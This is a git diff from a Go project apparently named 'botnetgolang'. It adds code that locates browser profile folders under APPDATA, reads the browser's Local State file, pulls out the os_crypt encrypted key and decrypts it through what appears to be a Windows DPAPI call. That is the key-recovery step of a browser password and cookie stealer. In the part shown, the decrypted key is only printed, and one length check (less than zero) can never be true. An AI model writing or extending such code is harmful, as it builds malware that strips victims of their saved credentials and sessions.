@@ -3,6 +3,7 @@ package internal
 import (
 	"botnetgolang/internal/model"
 	"botnetgolang/internal/pkg"
+	"encoding/json"
 	"fmt"
 	"io/ioutil"
 	"os"
@@ -12,8 +13,8 @@ import (
 
 var jsonData []interface{}
 
-func FunGetProfile(browser model.BrowserPaths) map[string]interface{} {
-	jsonObj := make(map[string]interface{})
+func FunGetProfile(browser model.BrowserPaths) *model.AllProfile {
+	var result model.AllProfile
 
 	ppp := os.Getenv("APPDATA")
 	if ppp == "" {
@@ -45,11 +46,32 @@ func FunGetProfile(browser model.BrowserPaths) map[string]interface{} {
 	if err != nil {
 		panic(err)
 	}
+	// lay cac profile
+	result.Alls = alls
+	result.PathSource = ppp
+	result.UserData = pathfolderD
+	result.Version = textF
 
-	jsonObj["alls"] = alls
-	jsonObj["goc"] = ppp
-	jsonObj["userData"] = pathfolderD
-	jsonObj["version"] = textF
+	return &result
+}
 
-	return jsonObj
+func MainBL(browser model.BrowserPaths) {
+	allProfile := FunGetProfile(browser)
+	if len(allProfile.Alls) < 0 {
+		return
+	}
+	textF, err := pkg.ReadTextFile(allProfile.PathSource + browser.Local)
+	if err != nil {
+		return
+	}
+	var dataC map[string]interface{}
+	err = json.Unmarshal([]byte(textF), &dataC)
+	if err != nil {
+		return
+	}
+
+	alltt := dataC["os_crypt"].(map[string]interface{})["encrypted_key"].(string)
+	tt := alltt[5:]
+	fmt.Println(pkg.UnprotectData([]byte(tt)))
+
 }
